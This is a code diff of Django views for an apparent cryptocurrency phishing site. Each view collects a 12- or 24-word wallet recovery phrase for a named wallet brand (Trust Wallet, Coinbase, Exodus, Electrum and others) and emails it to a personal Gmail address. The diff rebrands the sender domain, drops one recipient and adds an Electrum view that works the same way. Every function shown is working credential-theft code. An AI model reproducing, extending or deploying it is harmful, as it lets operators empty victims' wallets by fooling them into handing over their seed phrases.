@@ -40,7 +40,7 @@ def trust_wallet(request):
             wallet.wallet = 'trust wallet'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -58,7 +58,7 @@ def coinbase(request):
             wallet.wallet = 'coinbase'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 print(wallet.phrase.count(' '))
                 wallet.save()
@@ -78,7 +78,7 @@ def one_inch(request):
             wallet.wallet = '1inch'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -97,7 +97,7 @@ def aave(request):
             wallet.wallet = 'aave'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -116,7 +116,7 @@ def algorand(request):
             wallet.wallet = 'algorand'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -153,7 +153,7 @@ def defiat(request):
             wallet.wallet = 'defiat'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -172,7 +172,7 @@ def fantom(request):
             wallet.wallet = 'fantom'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -191,7 +191,7 @@ def mew(request):
             wallet.wallet = 'mew'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -210,7 +210,7 @@ def solareum(request):
             wallet.wallet = 'solareum'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -229,7 +229,7 @@ def solflare(request):
             wallet.wallet = 'solflare'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -247,7 +247,7 @@ def tron(request):
             wallet.wallet = 'tron'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -265,7 +265,7 @@ def exodus(request):
             wallet.wallet = 'exodus'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -283,7 +283,7 @@ def atomic_wallet(request):
             wallet.wallet = 'Atomic wallet'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
                           ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
@@ -301,8 +301,8 @@ def coinomi(request):
             wallet.wallet = 'coinomi'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
-                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com' ])
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
+                          ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
                 messages.error(request, error)
@@ -319,8 +319,8 @@ def dash_wallet(request):
             wallet.wallet = 'dash wallet'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
-                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com' ])
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
+                          ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
                 messages.error(request, error)
@@ -337,8 +337,8 @@ def litecoin(request):
             wallet.wallet = 'litecoin'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
-                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com' ])
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
+                          ['buhariemmanuel91@gmail.com' ])
                 wallet.save()
             else:
                 messages.error(request, error)
@@ -355,8 +355,26 @@ def kraken(request):
             wallet.wallet = 'kraken'
             if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
                 messages.success(request, success)
-                send_mail(wallet.wallet, wallet.phrase, 'info@walletsrectifier.com',
-                          ['buhariemmanuel91@gmail.com', 'kehindeogundimu731@gmail.com' ])
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
+                          ['buhariemmanuel91@gmail.com'])
+                wallet.save()
+            else:
+                messages.error(request, error)
+    else:
+        form = PhraseForm()
+    return render(request, 'phrase.html', {'form': form})
+
+
+def electrum(request):
+    if request.method == 'POST':
+        form = PhraseForm(request.POST)
+        if form.is_valid():
+            wallet = form.save(commit=False)
+            wallet.wallet = 'electrum'
+            if wallet.phrase.count(' ') == 11 or wallet.phrase.count(' ') == 23:
+                messages.success(request, success)
+                send_mail(wallet.wallet, wallet.phrase, 'info@chainsynchronizer.com',
+                          ['buhariemmanuel91@gmail.com'])
                 wallet.save()
             else:
                 messages.error(request, error)
